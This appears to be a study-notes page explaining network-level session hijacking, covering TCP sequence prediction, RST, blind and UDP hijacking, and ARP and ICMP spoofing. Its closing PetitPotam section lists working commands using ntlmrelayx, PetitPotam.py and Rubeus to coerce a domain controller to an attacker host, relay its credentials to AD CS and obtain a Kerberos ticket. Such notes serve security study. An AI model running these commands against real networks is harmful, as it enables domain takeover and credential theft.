# 🌐 Network-Level Session Hijacking
**Network-Level Session Hijacking** is a method where attackers take control of a user's session by targeting the communication between devices on a network. Unlike other types, it doesn’t need access to the victim's device or specific application code. Instead, attackers hijack the session by exploiting transport and internet protocols. This allows them to capture important session data, which can later be used to launch deeper attacks at the application level. It’s a powerful and stealthy technique often used to gain unauthorized access without detection.

The following are different types of network-level hijacking: 
```
- Blind hijacking	- RST hijacking
- UDP hijacking		- Man-in-the-middle: packet sniffer
- TCP/IP hijacking	- IP spoofing: source routed packets
```
---
## Three-way Handshake 
**Three-way Handshake** is the process used by **TCP** to establish a connection between two devices. First, the **client sends a SYN** (synchronize) request with an initial sequence number. The **server replies with SYN-ACK**, confirming the client's request and sending its own sequence number. Finally, the **client sends an ACK**, confirming the server’s sequence number. After this, both are in the **established state** and can start communication.

To identify each session, **IP addresses, port numbers, and sequence numbers** are used. IP and port are easy to find, but **sequence numbers keep changing**, making it hard for attackers to guess. However, if an attacker correctly guesses the sequence number, they can **hijack the session** by tricking the server into accepting fake packets. Connections can be closed using **FIN**, **RST**, or timeout methods depending on the situation.

![image](https://github.com/user-attachments/assets/03f4201a-28ac-4321-92ea-3bd5e522132c)

The three-way handshake shown in the above figure involves the following steps. 
1. Bob initiates a connection with the server and sends a packet to the server with the SYN flag set.
2. The server receives this packet and sends a packet with the SYN + ACK flag and an initial sequence number (ISN) for the server.
3. Bob sets the ACK flag acknowledging the receipt of the packet and increments the sequence number by 1.
4. The two machines have successfully established a session.

If the attacker can anticipate the next sequence number and ACK number that Bob will send, they can spoof Bob’s address and start communication with the server.

## TCP/IP Hijacking 
**TCP/IP Hijacking** is a cyberattack where the attacker takes over an active connection between two devices by sending fake (spoofed) network packets. The attacker tricks one side into thinking they are still talking to the original user, while the real user gets disconnected. This allows the attacker to control the session and send data as if they were the victim. Both the attacker and victim must be on the same network, but the server can be anywhere. This method is especially dangerous for systems using one-time passwords, as it lets attackers bypass security after login.

TCP/IP hijacking is performed through the following steps.
- The attacker sniffs the victim's connection and uses the victim’s IP address to send a spoofed packet with the predicted sequence number.
- The receiver processes the spoofed packet, increments the sequence number, and sends an acknowledgement to the victim's IP address.
- The victim machine is unaware of the spoofed packet. Therefore, it ignores the receiver machine’s ACK packet and turns off sequence number count.
- Consequently, the receiver receives packets with the incorrect sequence number.
- The attacker forces the victim’s connection with the receiver machine into a desynchronized state.
- The attacker tracks sequence numbers and continuously spoofs packets that originate from the victim’s IP address.
- The attacker continues to communicate with the receiver machine, while the victim’s connection hangs.

![image](https://github.com/user-attachments/assets/225e8754-d578-48cb-a658-a8796f2535dc)

In **local TCP/IP session hijacking**, the attacker takes over an active session by sending a packet with the **next expected sequence number** before the user does. In the image, the expected sequence number is **1420**. If the attacker sends data using that sequence number first, the server accepts the attacker’s packet and **syncs** with them instead of the real user.

The user, unaware of this, keeps sending data, but the server drops those packets thinking they are duplicates. As a result, the attacker successfully hijacks the session and communicates with the server as if they were the real user, while the actual user is locked out of the session.

## IP Spoofing: Source Routed Packets 
**IP Spoofing with Source Routed Packets** is a method attackers use to hijack a trusted network session. They fake (or **spoof**) the IP address of a trusted host so the target server thinks it's communicating with a legitimate user. By using **source routing**, the attacker decides the path the packets take, tricking the server even more.

After spoofing the IP, the attacker changes the **sequence** and **acknowledgment numbers** in the TCP session to match the server's expectations. This creates a **desync** with the real user, allowing the attacker to inject fake packets into the session. The server then accepts these forged packets, thinking they're from the trusted host, giving the attacker control over the session.

## RST Hijacking 
**RST Hijacking** is a technique where an attacker sends a fake **reset (RST) packet** to break a connection between two systems. By **spoofing the source IP** and correctly **guessing the acknowledgment number**, the attacker tricks the victim into thinking the reset is real. As a result, the connection is forcefully closed. Tools like **Colasoft Packet Builder** and **tcpdump** can be used to perform or analyze this type of attack.

## Blind Hijacking 
**Blind Hijacking** is a type of attack where the attacker sends malicious commands into an active TCP session without seeing the actual data being exchanged. The attacker guesses the next sequence number (ISN) to inject data like a new password or access command. However, they **cannot see the response**, which makes this method limited. For full control and visibility, a **Man-in-the-Middle (MITM)** attack is more effective.

## UDP Hijacking 
**UDP Hijacking** is a type of attack where an attacker takes control of a UDP session between two systems. Since **UDP is connectionless** and doesn’t check the order or integrity of data, it’s easier to hijack than TCP. An attacker can send a fake response to the client before the real server does, tricking the client into accepting it. If the attacker is using **packet sniffing** or a **Man-in-the-Middle (MITM)** setup, they can block the real server’s reply, making the attack even more effective—all without the victim noticing.

### How UDP Hijacking Works: 
* **Spoofing Source IP Address** - 
  Since UDP doesn't require a connection setup, attackers can send fake packets by pretending to be a trusted IP address.

* **Intercepting the Traffic** - 
  The attacker sends forged UDP packets that look real to the client or server, but actually contain malicious content.

* **Manipulating the Communication** - 
  By injecting false data or commands, the attacker can change how the application behaves — like causing errors or triggering unauthorized actions.

## MITM Attack Using Forged ICMP and ARP Spoofing 
An MITM attack uses a packet sniffer to intercept communication between a client and server. The attacker changes the default gateway of the client’s machine and attempts to reroute packets. The packets between the client and server are routed through the hijacker’s host by using the following two techniques. 

### Forged Internet Control Message Protocol (ICMP) 
**Forged ICMP (Internet Control Message Protocol)** attacks involve sending fake error messages to trick a client and server into changing their communication path. Attackers forge ICMP packets to make it seem like there’s a problem with the original connection. As a result, the traffic is rerouted through the attacker’s system, allowing them to intercept or manipulate the data without the victim knowing.

### Address Resolution Protocol (ARP) Spoofing
**ARP Spoofing** is a network attack where the attacker tricks a device into thinking their machine is the correct one to send data to. Normally, devices use **ARP tables** to link IP addresses with MAC addresses. In this attack, the hacker sends fake ARP replies to update the victim’s ARP table with the attacker’s MAC address. As a result, the victim unknowingly sends its data to the attacker instead of the real destination, allowing the attacker to intercept or manipulate the traffic.

In both techniques, an attacker routes the packets in transit between the client and server through their machine.

## PetitPotam Hijacking 
**PetitPotam Hijacking** is a technique where an attacker tricks a **domain controller (DC)** into authenticating to the attacker's server. This is done using a Windows feature called **Microsoft’s Encrypting File System Remote Protocol**  (**MS-EFSRPC**). The attacker sets up a fake **SMB server** to capture the **NTLM hash** from the DC, making it think the attacker is a trusted user.

Using a valid user’s credentials, the attacker then relays this authentication to **Active Directory Certificate Services (AD CS)** to generate a certificate. With this certificate, the attacker gains **admin access**, taking control of the **domain controller** and the entire network.

Steps to perform PetitPotam hijacking are as follows:
1. Attacker uses the already captured NTLM credentials to authenticate with the target server.
2. The attacker uses the EfsRpcOpenFileRaw command from MS-EFSRPC API to coerce the target server to perform NTLM authentication of another system.
3. Now, the attacker initiates NTLM replay attack to gain remote access to the target AD CS.
4. Finally, the attacker creates an AD certificate to gain administrator privileges to the target AD server.

![image](https://github.com/user-attachments/assets/7bec8a80-613f-4dae-acaa-e33f278bd56a)

Run the following commands to perform a PetitPotam hijacking attack: 
```bash
# Step 1: Find the Certificate Authority (CA) on the target domain
certutil.exe
# [Filter: Certificate Authority Identification]
# Purpose: Lists available CAs on the network that support web enrollment (used later in ADCS abuse)

# Step 2: Relay captured credentials to the CA using Impacket’s ntlmrelayx tool
ntlmrelayx.py -t http://<CA-IP>/certsrv/ -smb2support --adcs --template DomainController
# [Filter: Credential Relay & ADCS Abuse]
# Purpose: Starts a relay server to capture NTLM credentials and request a certificate for domain controller access.

# Step 3: Force the Domain Controller (DC) to authenticate to our relay server using PetitPotam (with creds)
python3 PetitPotam.py -d <domain.local> -u <username> -p <password> <attacker-ip> <dc-ip>
# [Filter: Forced Authentication Trigger (MS-EFSRPC)]
# Purpose: Forces the DC to connect to our fake SMB listener, allowing us to relay and capture credentials.

# Optional Step 4: Trigger DC to authenticate without any credentials (if it's vulnerable)
python3 PetitPotam.py <attacker-ip> <dc-ip>
# [Filter: Anonymous Trigger (No Credentials)]
# Purpose: If the DC allows unauthenticated EFSRPC requests, this forces it to send NTLM hashes to our listener.

# Step 5: Use Rubeus to get a Kerberos ticket using the certificate hash obtained
Rubeus.exe asktgt /outfile:ticket.kirbi /dc:<dc-ip> /domain:<domain.local> /user:<target-user> /ptt /certificate:<hash>
# [Filter: Certificate-to-TGT]
# Purpose: Requests a TGT (Kerberos ticket) using the stolen certificate to impersonate a Domain Controller.
```
